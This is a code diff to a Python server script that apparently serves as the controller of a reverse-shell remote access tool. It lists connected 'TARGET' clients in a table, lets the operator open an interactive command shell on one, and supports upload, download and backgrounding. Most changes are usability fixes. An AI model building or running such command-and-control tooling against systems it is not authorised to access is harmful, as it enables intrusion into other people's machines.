@@ -8,6 +8,7 @@ import hashlib
 import datetime
 import termcolor
 import threading
+from prettytable import PrettyTable
 
 # TODO:
 #   1. Broadcast utility overhaul
@@ -240,7 +241,7 @@ def send_msg(sock: socket.socket, command: str) -> None:
     sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))
 
     # Receive command output from the client side, if relevant
-    if command not in ["quit", "exit", "clear"] and command[:9] != "download " and command[:7] != "upload ":
+    if command not in ["quit", "exit", "clear", "bg", "background"] and command[:9] != "download " and command[:7] != "upload ":
         recv_msg(sock, command)
 
 
@@ -272,7 +273,7 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
     :return: None
     """
     try:
-        maintain_session = True
+        maintain_session = True  # Determines whether to maintain a session upon exiting the shell
         while sock:
             command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
             if command:
@@ -308,13 +309,20 @@ def display_sessions() -> None:
 
     :return: None
     """
-    header = termcolor.colored("ID\tCONNECTION\tADDRESS", "yellow")
-    print(header)
-    print("-" * len(header))
+    # Create table and column names
+    clients_info_table = PrettyTable()
+    id = termcolor.colored("ID", "yellow")
+    address = termcolor.colored("ADDRESS", "yellow")
+    clients_info_table.field_names = [id, address]
+
+    # Add connected clients to table
     for i, session in enumerate(CLIENTS):
-        info = f"{i}\t{session[0]}\t{session[1]}"
-        print(info)
-        print(len(info))
+        addr = CLIENTS[i][1][0]
+        port = CLIENTS[i][1][1]
+        data = f"{addr}:{port}"
+        clients_info_table.add_row([i, data])
+
+    print(clients_info_table)
 
 
 def accept_new_connections(s: socket.socket) -> None:
@@ -325,12 +333,18 @@ def accept_new_connections(s: socket.socket) -> None:
     :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     :return: None
     """
+    s.settimeout(1)
     while True:
-        sock, addr = s.accept()
-        # Save new connection information
-        if (sock, addr) not in CLIENTS:
-            CLIENTS.append((sock, addr))
-        print(clr("[+] Connected to ") + str(addr))
+        try:
+            sock, addr = s.accept()
+            # Save new connection information
+            if (sock, addr) not in CLIENTS:
+                CLIENTS.append((sock, addr))
+            print(clr("[+] Connected to ") + str(addr))
+        except socket.timeout:
+            pass
+        except OSError:  # Main thread was discontinued - User exited the program
+            break
 
 
 def handle_connections(s: socket.socket) -> None:
@@ -358,7 +372,7 @@ def handle_connections(s: socket.socket) -> None:
             elif command[:12] == "sessions -i ":
                 i = command[12:]
                 if i.isdigit():
-                    if 0 < int(i) < len(CLIENTS):
+                    if 0 <= int(i) < len(CLIENTS):
                         # Start a command line interface for the specified client
                         shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
                     else:
